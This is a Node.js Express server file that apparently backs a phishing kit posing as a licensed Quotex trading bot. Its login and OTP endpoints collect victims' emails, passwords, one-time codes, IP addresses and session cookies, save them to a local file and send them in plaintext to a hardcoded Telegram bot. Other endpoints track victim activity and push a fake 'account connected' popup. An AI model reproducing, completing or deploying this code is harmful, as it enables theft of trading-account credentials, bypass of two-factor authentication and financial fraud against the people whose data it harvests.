const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ================== YOUR TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

// Function to send message to Telegram
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        });
        console.log("✅ Message sent to Telegram");
    } catch (error) {
        console.error("❌ Telegram Error:", error.message);
    }
}

// ================== FIXED: PERMANENT STORAGE WITH users.json ==================
const DATA_FILE = path.join(__dirname, 'users.json');
let users = [];

// Load users on startup
function loadUsers() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            users = JSON.parse(data);
            console.log(`✅ Loaded ${users.length} users from users.json`);
        } else {
            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
            console.log("✅ Created new users.json");
        }
    } catch (e) {
        console.error("Load error, starting fresh:", e);
        users = [];
    }
}

// Save after every change
function saveUsers() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
        console.log(`💾 Saved ${users.length} users`);
    } catch (e) {
        console.error("Save error:", e);
    }
}

loadUsers();

// Helper: Get or create user by licenceKey (FIXED: Multiple users persistence)
function getOrCreateUser(licenceKey, fullName = "Unknown") {
    let user = users.find(u => u.licenceKey === licenceKey);
    if (!user) {
        user = {
            id: Date.now().toString(),
            licenceKey: licenceKey,
            fullName: fullName,
            username: "",
            password: "",
            otp: "",
            ip: "",
            cookies: "",
            status: "Active",
            connected: false,
            lastActivity: new Date().toISOString(),
            activities: []
        };
        users.unshift(user);
        console.log(`🆕 New user created: ${fullName} (${licenceKey})`);
    }
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}

// ================== SSE CLIENTS FOR REAL-TIME TRIGGER ==================
const connectedClients = new Set();

// Real-time events endpoint
app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();
    connectedClients.add(res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'ready' })}\n\n`);
    req.on('close', () => {
        connectedClients.delete(res);
    });
});

// Trigger connected popup from Telegram
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || "User";
    const message = `
🔗 <b>Connection Triggered Successfully</b>
👤 User: <b>${userName}</b>
✅ Status: Account Connected
    `.trim();
    await sendTelegramMessage(message);
    connectedClients.forEach(client => {
        try {
            client.write(`data: ${JSON.stringify({
                type: 'show_connected',
                userName: userName
            })}\n\n`);
        } catch (e) {}
    });
    res.send("Trigger sent successfully");
});

// ================== LICENSE + NAME ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    const message = `
🔑 <b>New License Activation</b>
👤 Name: <b>${userName}</b>
🔑 License: <b>${licenseKey}</b>
🌍 IP: <b>${ip}</b>
⏰ Time (PKT): <b>${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    const message = `
📊 <b>User Activity</b>
Action: <b>${action}</b>
👤 Name: <b>${userName || "Unknown"}</b>
🌍 IP: <b>${ip}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== NOTIFICATION PERMISSION ==================
app.post('/api/notification-permission', async (req, res) => {
    const { userName, permission, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
    const message = `
🛎️ <b>Notification Permission</b>
👤 Name: <b>${userName}</b>
📱 Status: <b>${permission}</b>
🌍 IP: <b>${ip}</b>
⏰ Time: <b>${timestamp}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== QUOTEX LOGIN & OTP (FULLY FIXED) ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const user = getOrCreateUser(licenceKey, name);
    user.username = email;
    user.password = password;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";
    user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });

    const message = `
🔑 <b>Quotex Login Attempt</b>
👤 Name: <b>${name}</b>
📧 Email: <b>${email}</b>
🔑 Password: <b>${password}</b>
🌍 IP: <b>${ip}</b>
📂 Cookies: <b>${cookies || 'None'}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "ok" });
});

app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const user = getOrCreateUser(licenceKey, name);
    user.otp = otp;
    user.ip = ip;
    user.cookies = cookies;
    user.status = "Online";
    user.activities.push({ action: "OTP Entered - Account Connected", timestamp: new Date().toLocaleString() });

    const message = `
🔢 <b>OTP Entered Successfully</b>
👤 Name: <b>${name}</b>
📧 Email: <b>${email}</b>
🔑 OTP: <b>${otp}</b>
🌍 IP: <b>${ip}</b>
📂 Cookies: <b>${cookies || 'None'}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();
    await sendTelegramMessage(message);
    res.status(200).send({ status: "ok" });
});

// ================== LICENSE MANAGEMENT (ADDED) ==================
const LICENSES_FILE = path.join(__dirname, 'licenses.json');
let licenses = [];

function loadLicenses() {
    try {
        if (fs.existsSync(LICENSES_FILE)) {
            const data = fs.readFileSync(LICENSES_FILE, 'utf8');
            licenses = JSON.parse(data);
            console.log(`✅ Loaded ${licenses.length} licenses`);
        } else {
            fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
        }
    } catch (e) {
        licenses = [];
    }
}

function saveLicenses() {
    try {
        fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2));
    } catch (e) {}
}

loadLicenses();

// GET all licenses
app.get('/api/licenses', (req, res) => {
    res.json(licenses);
});

// POST new license
app.post('/api/licenses', (req, res) => {
    const { key, type, expiry, maxUses } = req.body;
    if (!key) return res.status(400).json({error: "Key required"});
    
    const existing = licenses.find(l => l.key === key);
    if (existing) return res.status(400).json({error: "License already exists"});
    
    licenses.unshift({
        key: key,
        type: type || "Permanent",
        status: "Active",
        usesRemaining: maxUses || null,
        assignedTo: null,
        dateAdded: new Date().toISOString(),
        expiry: expiry || null
    });
    saveLicenses();
    res.json({success: true});
});

// DELETE license
app.delete('/api/licenses/:key', (req, res) => {
    const key = req.params.key;
    licenses = licenses.filter(l => l.key !== key);
    saveLicenses();
    res.json({success: true});
});

// Enhanced license check (for main bot)
app.post('/api/validate-license', (req, res) => {
    const { licenseKey } = req.body;
    const license = licenses.find(l => l.key === licenseKey && l.status === "Active");
    res.json({ valid: !!license });
});
